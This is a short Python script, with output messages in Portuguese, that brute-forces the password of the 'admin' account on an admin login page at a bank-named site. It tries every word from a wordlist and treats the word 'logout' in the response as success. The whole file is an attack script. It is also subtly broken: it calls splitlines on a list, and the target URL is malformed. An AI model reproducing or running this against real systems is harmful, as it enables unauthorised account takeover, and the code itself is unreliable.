import requests


with open('wordlist.txt', 'r') as file:
    wordlist = file.readlines().splitlines()

    for word in wordlist:
        data = {'user': 'admin', 'password': word}
        response = requests.post('http://advanced/bancocn.com/admin/index.php', data=data)
        if 'logout' in response.text:
            print('Senha: {} -> Correta! :)'.format(word))
        else:
            print('Senha: {} -> Incorreta! :('.format(word))